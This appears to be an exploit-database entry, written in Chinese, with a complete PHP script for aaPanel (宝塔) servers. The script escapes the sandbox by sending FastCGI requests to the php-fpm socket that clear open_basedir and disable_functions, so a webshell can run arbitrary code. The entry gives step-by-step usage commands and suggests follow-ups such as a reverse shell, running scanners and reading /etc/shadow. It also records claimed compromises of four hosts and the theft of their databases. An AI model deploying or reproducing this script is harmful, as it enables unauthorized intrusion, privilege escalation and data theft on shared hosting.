# php-fpm FastCGI 沙箱逃逸：PHP_ADMIN_VALUE 清零 open_basedir 与 disable_functions（宝塔环境通用）

- **code**: php-fpm-fastcgi-沙箱逃逸-php_admin_value-清零-open_basedir-与-disable_functions-宝塔环境通用
- **kind**: exp
- **category**: privesc
- **component**: 宝塔(aapanel) + php-fpm (unix socket) + nginx
- **severity**: critical
- **language**: php
- **source**: self
- **verified**: 1
- **verified_note**: 在 4 台宝塔节点实测成功：203.0.113.114(ag3Nhcnj)、203.0.113.115(ag3Nhcnj)、203.0.113.4(h3Otd8i2, PHP 5.6.30)、203.0.113.99(JlOQ6wBy)。均返回 OB=[/] DF_LEN=0；据此 glob('/www/wwwroot/*') 露出各物理机全部站点（131: 6 个站；84: 9 个站；160: 5 个站）并读出各自 config.db.php 与本地库（article 11640~15079 / user 406~1048 / bills 907~1516 / admin 7~12）。
- **path**: pocs/php-fpm-fastcgi-沙箱逃逸-php_admin_value-清零-open_basedir-与-disable_functions-宝塔环境通用/fcgi_run.php
- **tags**: php-fpm,FastCGI,open_basedir绕过,disable_functions绕过,宝塔,aapanel,提权,沙箱逃逸,通用武器
- **created_at**: 2026-10-13T12:35:44.442Z
- **found_by**: exploit

## 描述

经宝塔 php-fpm 的 unix socket 用 FastCGI 注入 PHP_ADMIN_VALUE，把 open_basedir 改成 /、disable_functions 清空，再用同一通道执行任意 PHP。用于突破"拿到 WebShell 但被 open_basedir 锁在单站目录、且命令执行函数全禁"的常见僵局。

## 用法

```
1) 用已有 WebShell 把本文件写到目标 webroot 可访问路径（例如 ./Public/www/fcgi_x.php）。
2) 自检：curl -H 'Host: <vhost>' http://<ip>/Public/www/fcgi_x.php  → 返回 RDY_FCGI
3) 执行任意 PHP：
   python -c "import base64,requests;code=open('task.php','rb').read();print(requests.post('http://<ip>/Public/www/fcgi_x.php',headers={'Host':'<vhost>'},data={'t':base64.b64encode(b'echo php_uname();').decode()}).text)"
   或直接：
   curl -s -H 'Host: <vhost>' --data-urlencode "t=$(echo -n 'echo ini_get("open_basedir");' | base64 -w0)" http://<ip>/Public/www/fcgi_x.php

★ 要点/约束：
· socket 名随 PHP 版本变化：/tmp/example.com、php-cgi-74.sock、example.com…先 glob('/tmp/php-cgi*') 确认
· 必须先把代码写到【目标机器本地】文件（如 /tmp/fcgi_in.php）再让 fpm 执行；不能直接把代码塞进 FastCGI body
· open_basedir 含 /tmp/ 是前提（这样我们才有权限写 /tmp 并调用 socket）；若 /tmp 不在白名单需换路径
· 成功判据：返回里出现 OB=[/] 且 DF_LEN=0
· 命令执行恢复后（disable_functions 清空）即可反弹 shell / 跑 gogo/fscan / 读 /etc/shadow 等
· 痕迹：会在 /tmp 留下 fcgi_in.php 与 runner；用后自行清理（本任务红线要求不删他人文件，仅清自己的）
```

## 正文

```
<?php
// fcgi_run.php — 部署到目标 webroot，POST t=<base64 php code> 即可以 open_basedir=/ 执行任意 PHP。
// 原理：/tmp/example.com 通常是宝塔 php-fpm 池的监听 socket；经 FastCGI 的 PHP_ADMIN_VALUE/
//       PHP_VALUE 注入可覆盖池级 open_basedir 与 disable_functions（php-fpm 允许 per-request 覆盖）。
@set_time_limit(0);

function fcgi_nv($n, $v) {
    $r = "";
    if (strlen($n) < 128) { $r .= chr(strlen($n)); }
    else { $r .= chr((strlen($n) >> 24) & 0xFF) . chr((strlen($n) >> 16) & 0xFF) . chr((strlen($n) >> 8) & 0xFF) . chr(strlen($n) & 0xFF); }
    if (strlen($v) < 128) { $r .= chr(strlen($v)); }
    else { $r .= chr((strlen($v) >> 24) & 0xFF) . chr((strlen($v) >> 16) & 0xFF) . chr((strlen($v) >> 8) & 0xFF) . chr(strlen($v) & 0xFF); }
    return $r . $n . $v;
}
function fcgi_h($t, $c) {
    $len = strlen($c);
    $pad = (8 - ($len % 8)) % 8;
    return chr(1) . chr($t) . chr(0) . chr(1) . chr(($len >> 8) & 0xFF) . chr($len & 0xFF)
         . chr($pad) . chr(0) . $c . str_repeat(chr(0), $pad);
}
function run_fcgi($SOCK, $SCRIPT, $ADMIN, $STDIN = '') {
    $P = array(
        "GATEWAY_INTERFACE" => "FastCGI/1.0",
        "REQUEST_METHOD"    => "GET",
        "SCRIPT_FILENAME"   => $SCRIPT,
        "SCRIPT_NAME"       => "/x.php",
        "QUERY_STRING"      => "",
        "REQUEST_URI"       => "/x.php",
        "DOCUMENT_ROOT"     => "/tmp",
        "SERVER_PROTOCOL"   => "HTTP/1.0",
        "REMOTE_ADDR"       => "127.0.0.1",
        "REMOTE_PORT"       => "44444",
        "SERVER_ADDR"       => "127.0.0.1",
        "SERVER_PORT"       => "80",
        "SERVER_NAME"       => "localhost",
        "SERVER_SOFTWARE"   => "nginx",
        "CONTENT_LENGTH"    => strlen($STDIN),
        "PHP_ADMIN_VALUE"   => $ADMIN,   // ★ 关键：清掉 open_basedir / disable_functions
        "PHP_VALUE"         => $ADMIN,
    );
    $e1 = 0; $e2 = "";
    $s = @stream_socket_client("unix://" . $SOCK, $e1, $e2, 5);
    if (!$s) { echo "SOCK_FAIL " . $SOCK . " " . $e2 . "\n"; return false; }
    stream_set_timeout($s, 60);
    @fwrite($s, fcgi_h(1, chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0))); // BEGIN_REQUEST responder
    $blob = "";
    foreach ($P as $k => $v) { $blob .= fcgi_nv($k, $v); }
    @fwrite($s, fcgi_h(4, $blob));  // PARAMS
    @fwrite($s, fcgi_h(4, ""));
    @fwrite($s, fcgi_h(5, $STDIN)); // STDIN
    @fwrite($s, fcgi_h(5, ""));
    $out = "";
    while (!feof($s)) {
        $h = @fread($s, 8);
        if (strlen($h) < 8) { break; }
        $t = ord($h[1]);
        $len = (ord($h[4]) << 8) + ord($h[5]);
        $pad = ord($h[6]);
        $c = ""; $need = $len;
        while ($need > 0) { $b = @fread($s, $need); if ($b === false || $b === "") { break; } $c .= $b; $need -= strlen($b); }
        if ($pad > 0) { @fread($s, $pad); }
        if ($t == 6) { $out .= $c; }
        if ($t == 3) { break; }
    }
    @fclose($s);
    echo $out;
    return true;
}

$b64 = isset($_REQUEST['t']) ? $_REQUEST['t'] : '';
if ($b64 === '') { echo "RDY_FCGI"; return; }
$code = base64_decode($b64);
@file_put_contents('/tmp/fcgi_in.php', "<?php\n" . $code);
@clearstatcache();
foreach (array('/tmp/php-cgi-74.sock', '/tmp/example.com', '/tmp/example.com', '/tmp/php-cgi-73.sock') as $sk) {
    if (@file_exists($sk)) { echo "\n--- " . $sk . " ---\n"; run_fcgi($sk, '/tmp/fcgi_in.php', "open_basedir=/\ndisable_functions=", ''); }
}

```
